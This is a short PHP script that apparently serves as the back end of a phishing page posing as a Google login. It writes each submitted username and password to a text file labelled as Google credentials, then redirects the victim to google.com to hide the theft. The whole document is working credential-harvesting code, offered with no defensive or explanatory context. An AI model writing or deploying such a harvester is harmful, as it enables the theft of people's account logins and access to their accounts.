<?php 
file_put_contents("usernames.txt", "Google Username: " . $_POST['username'] . " Pass: " . $_POST['password'] ."\n", FILE_APPEND);
header('Location: https://www.google.com');
exit();
?>
